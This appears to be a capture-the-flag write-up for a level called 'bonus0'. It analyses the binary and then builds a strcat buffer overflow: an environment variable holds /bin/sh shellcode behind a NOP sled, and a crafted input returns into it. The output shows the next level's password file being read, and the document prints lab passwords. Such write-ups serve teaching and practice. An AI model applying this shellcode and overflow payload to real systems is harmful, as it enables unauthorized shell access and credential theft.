# Bonus 0
*password : f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728*

## Analyze
```
$ scp -P 4242 bonus0@192.168.56.108:bonus0 binary/
```
~uVar2 => inverse each bit
```
    *(undefined2 *)(str + (~uVar2 - 1)) = 32;
```
32 = `space`\
put a space at the end of input1\
ex: if no overflow output = "input1`space`input2"

## Buffer overflow : strcat exploit

- "reduce" shellcode :
```
$ scp -P 4242 bonus0/Ressources/getenv.c bonus0@192.168.56.108:/tmp/
```
```
$ export SHELLCODE=$(python -c 'print "\x90" * 200 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"')
$ cd /tmp
$ gcc getenv.c
$ ./a.out
0xbffff83f
```
- overflow on the input 2
- compute offset : 9

```
$ python -c 'print "\x90" * 4095 + "\n" + "\x90" * 9 + "\x3f\xf8\xff\xbf" + "\x42" * 8' > /tmp/bonus0
$ cat /tmp/bonus0 - | ./bonus0 
...
cat /home/user/bonus1/.pass
cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
```
